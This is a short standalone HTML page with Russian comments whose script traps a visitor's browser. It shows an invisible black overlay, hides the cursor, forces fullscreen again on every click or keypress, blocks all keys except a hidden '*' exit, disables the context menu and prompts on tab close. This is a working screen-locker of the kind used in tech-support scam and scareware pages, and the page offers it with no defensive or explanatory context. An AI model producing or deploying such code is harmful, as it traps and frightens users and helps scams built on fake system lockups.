<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title> </title>
    <style>
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            background: #000; overflow: hidden; cursor: none; 
        }
        /* Невидимый слой-ловушка поверх всего */
        #trap {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 999999; cursor: none;
        }
    </style>
</head>
<body>

<div id="trap"></div>

<script>
    const trap = document.getElementById('trap');
    let isActive = true;

    async function forceFS() {
        if (!isActive) return;
        try {
            const doc = document.documentElement;
            if (doc.requestFullscreen) await doc.requestFullscreen();
            else if (doc.webkitRequestFullscreen) await doc.webkitRequestFullscreen();
        } catch (e) {}
    }

    // Любой клик или попытка взаимодействия возвращает Fullscreen
    window.addEventListener('click', forceFS);
    window.addEventListener('mousedown', forceFS);

    // Блокировка ВСЕХ клавиш
    window.addEventListener('keydown', (e) => {
        if (e.key === "*") {
            isActive = false;
            document.body.style.cursor = "default";
            trap.style.display = "none";
            if (document.exitFullscreen) document.exitFullscreen();
            return;
        }

        if (isActive) {
            e.preventDefault();
            e.stopPropagation();
            // Любая клавиша (кроме *) провоцирует возврат в FS
            forceFS();
        }
    }, true);

    // Если вышел через Esc — ждем любого шороха, чтобы вернуть назад
    document.addEventListener('fullscreenchange', () => {
        if (isActive && !document.fullscreenElement) {
            // Без алертов мы просто ждем следующего клика/нажатия клавиши
            // но визуально экран остается черным и "мертвым"
        }
    });

    // Запрет контекстного меню
    window.oncontextmenu = (e) => { if (isActive) e.preventDefault(); };

    // Системное окно при попытке закрыть вкладку
    window.onbeforeunload = () => isActive ? "" : null;

</script>
</body>
</html>
